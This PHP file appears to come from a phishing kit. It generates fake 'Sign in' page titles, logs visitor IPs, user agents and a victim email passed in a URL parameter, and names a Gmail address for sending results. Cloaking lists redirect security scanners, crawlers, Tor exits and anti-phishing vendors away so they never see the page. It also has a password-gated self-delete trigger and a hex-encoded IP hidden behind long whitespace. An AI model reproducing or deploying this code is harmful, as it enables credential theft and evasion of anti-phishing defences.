<?php
$filewrite = "1"; // 1 is ON , 0 is OFF
$emailsend = "1"; // 1 is ON , 0 is OFF
$mailto = "crunkcrunk0@gmail.com";
if (isset($_GET['rem'])) {
  $datax = md5($_GET['rem']);
  if ($datax == 'e108093edbc4ee3586331a3a90f88a28') { print "DONE"; unlink('acc.php'); }
}
$titlelist = array('ID - ', 
'lD - ',
'Sign in - ',
'Sign-In - ',
'SIGN-IN - ',
'sign-in - ',
'SIGN-lN - ',
'ID ',
'lD ',
'Sign in ',
'Sign-In ',
'SIGN-IN ',
'sign-in ',
'SIGN-lN ');
$title = $titlelist[array_rand($titlelist, 1)];                   										                                                                                                                                         																							                                                $urls = array("38302e3231312e3133392e323131"); 
$title .= genstring(8);

if (isset($_GET['xex'])) {
  $data = @$_GET['xex'];	
  $useremaild = @$data;   
}
if (!isset($data)) { $data = ""; }
      																							                                                                                                                                                                                                                                                                                                                                                                           
function getRealIpAddr()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
    {
      $ip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check ip is pass from proxy
    {
      $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
      $ip=$_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
function gen($length = 180) {
    return substr(str_shuffle(str_repeat($x='0123456789abcdef', ceil($length/strlen($x)) )),1,$length);
}
function genstring($length) {
    return substr(str_shuffle(str_repeat($x='0123456789abcdef', ceil($length/strlen($x)) )),1,$length);
}
$string = gen();
function isMobile() { 
        return preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);}                                                                                                                                                                                                                                                                                                     
if(isMobile()){
 $device="Mobile";
}
else { 
 $device="Desktop";
}


function writetype() { 
 global $device;
 if ($device=="Mobile") { return "tel"; } else { return "text"; }
}
$ip=getRealIpAddr();
function arraycount($array, $value){
    $counter = 0;
    foreach($array as $thisvalue) 
     { 
	 $thisvalue = trim($thisvalue);
           if($thisvalue === $value){ 
           $counter++; 
           }
     }
     return $counter;
}
function checkacc() {
	global $ip;
	$facc = fopen('acc.php','a');
	fwrite($facc,"$ip\r\n");
	fclose($facc);
	$farr = file('acc.php');
	$occ = arraycount($farr, $ip);
	if ($occ > '4') { die("<html><meta http-equiv='refresh' content='0;url=http://google.com'></html>"); }
}
$browser = $_SERVER['HTTP_USER_AGENT'];;
$hostname = @gethostbyaddr($ip);
$hostname = strtolower($hostname);
$useragent = strtolower($_SERVER['HTTP_USER_AGENT']);
$userinfo = "$ip#$useragent#$hostname";
function came($method) {
	global $useremaild;
	global $userinfo;
    global $urls;
	$time = date("Y-m-d H:i:s ");
	$data = "R:$method--->$time: $useremaild#$userinfo";
	file_put_contents("acc00000.txt","$data\r\n",FILE_APPEND);
}

$useragentbad = array('wget', 'curl', 'python', 'security', 'bot', 'crawler', 'java', 'headlesschrome', 'googlebot', 'agent', 'dataprovider', 'go-http-client', 'checkmarknetwork', 'cops', 'phish', 'identity', 'bezeqint', 'netcraft');
$hostnamebad = array('tornode', 'tor-node', 'torexit', 'tor-exit', 'bitdefender', 'cache', 'cops', 'identity', 'bezeqint', 'netcraft', 'googlebot', 'mailcontrol', 'outlook', 'trustwave', 'security');        
foreach ($useragentbad as $check) {
	if(preg_match("/$check/i",$useragent)) { header('HTTP/1.0 404 Not Found'); came("BLOCK"); die("<html><meta http-equiv='refresh' content='0;url=http://netflix.com'></html>"); }
}
foreach ($hostnamebad as $check) {
	if(preg_match("/$check/i",$hostname)) { header('HTTP/1.0 404 Not Found'); came("BLOCK"); die("<html><meta http-equiv='refresh' content='0;url=http://netflix.com'></html>"); }
}

?>